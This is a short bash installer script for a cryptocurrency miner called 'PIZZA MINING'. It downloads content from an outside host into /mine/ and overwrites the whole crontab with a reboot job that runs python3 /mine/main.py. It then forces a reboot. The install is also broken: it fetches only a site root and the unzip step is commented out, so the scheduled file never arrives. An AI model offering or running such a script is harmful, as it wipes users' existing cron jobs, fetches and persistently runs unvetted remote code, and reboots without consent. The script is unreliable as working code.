#!/bin/bash

echo "Welcome to PIZZA MINING!!!
Installing..."

mkdir -p /mine/
wget "https://ravenapps.xyz" -q -P /mine/
# unzip /mine/client.zip
echo "@reboot python3 /mine/main.py" | crontab -

echo "Installed Successfully. After reboot mining will begin."
echo "Reboot in 5"
sleep 1
echo "4"
sleep 1
echo "3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1

reboot